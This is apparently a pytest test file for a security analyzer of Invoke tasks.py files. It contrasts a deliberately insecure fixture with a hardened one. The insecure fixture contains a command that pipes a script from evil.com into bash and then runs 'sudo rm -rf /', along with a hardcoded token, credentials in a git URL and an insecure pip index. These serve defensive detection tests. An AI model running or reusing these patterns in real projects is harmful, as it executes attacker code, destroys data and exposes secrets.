"""Tests for InvokeAnalyzer."""

from pathlib import Path

from devai.invoke_analyzer import InvokeAnalyzer, InvokeFinding


INSECURE_TASKS = """\
from invoke import task
import os

API_KEY = "hardcoded-secret-token-12345"

@task
def install(c):
    c.run("curl http://evil.com/install.sh | bash && sudo rm -rf /")
    c.run("pip install --index-url http://insecure.pypi.org/simple pkg")
    c.run("git clone http://user:pass@github.com/org/repo.git")

@task(warn_only=True, prompt=False, pty=True)
def deploy(c):
    c.run("sudo systemctl restart app", warn_only=True, prompt=False)
    c.cd("../../etc")

config.run.env = os.environ
"""

HARDENED_TASKS = """\
from __future__ import annotations

import os

from invoke import Collection, task


@task
def test(c):
    c.run("pytest tests", pty=False, warn_only=False)


@task
def deploy(c):
    token = os.environ.get("DEPLOY_TOKEN")
    if not token:
        raise RuntimeError("DEPLOY_TOKEN is required")
    c.run("deploy-cli --token $DEPLOY_TOKEN", pty=False)


ns = Collection(test, deploy)
"""


class TestInvokeAnalyzer:
    def test_detects_insecure_tasks_py(self, tmp_path: Path):
        (tmp_path / "tasks.py").write_text(INSECURE_TASKS, encoding="utf-8")
        analyzer = InvokeAnalyzer(str(tmp_path))
        findings = analyzer.analyze()
        kinds = {f.kind for f in findings}
        assert "hardcoded_secret" in kinds
        assert "insecure_http" in kinds
        assert "scm_credentials" in kinds
        assert "dangerous_command" in kinds
        assert "warn_only" in kinds
        assert "prompt_disabled" in kinds
        assert "env_forward_all" in kinds
        assert "insecure_pip_index" in kinds
        assert "chdir_outside" in kinds
        assert analyzer.health_score() < 50.0

    def test_hardened_tasks_clean(self, tmp_path: Path):
        (tmp_path / "tasks.py").write_text(HARDENED_TASKS, encoding="utf-8")
        analyzer = InvokeAnalyzer(str(tmp_path))
        findings = analyzer.analyze()
        high = [f for f in findings if f.severity == "high"]
        assert high == []
        assert analyzer.health_score() == 100.0

    def test_detects_tasks_package(self, tmp_path: Path):
        tasks_dir = tmp_path / "tasks"
        tasks_dir.mkdir()
        (tasks_dir / "__init__.py").write_text(INSECURE_TASKS, encoding="utf-8")
        analyzer = InvokeAnalyzer(str(tmp_path))
        findings = analyzer.analyze()
        assert any(f.path == "tasks/__init__.py" for f in findings)

    def test_finding_format(self, tmp_path: Path):
        (tmp_path / "tasks.py").write_text(INSECURE_TASKS, encoding="utf-8")
        analyzer = InvokeAnalyzer(str(tmp_path))
        findings = analyzer.analyze()
        finding = next(f for f in findings if f.kind == "hardcoded_secret")
        assert finding.path == "tasks.py"
        assert "[high]" in finding.format()

    def test_summary_and_context(self, tmp_path: Path):
        (tmp_path / "tasks.py").write_text(INSECURE_TASKS, encoding="utf-8")
        analyzer = InvokeAnalyzer(str(tmp_path))
        assert "Invoke configs:" in analyzer.summary()
        ctx = analyzer.to_context()
        assert "Invoke analysis:" in ctx
        assert "health score:" in ctx

    def test_generate_hardened_template(self):
        snippet = InvokeAnalyzer(".").generate_hardened_template()
        assert "tasks.py" in snippet or "invoke" in snippet
        assert "warn_only=False" in snippet

    def test_no_configs_returns_full_score(self, tmp_path: Path):
        analyzer = InvokeAnalyzer(str(tmp_path))
        assert analyzer.health_score() == 100.0
        assert analyzer.stats.config_files == 0

    def test_finding_dataclass(self):
        finding = InvokeFinding(
            kind="test",
            severity="low",
            message="test message",
            path="tasks.py",
            lineno=1,
        )
        assert "test message" in finding.format()
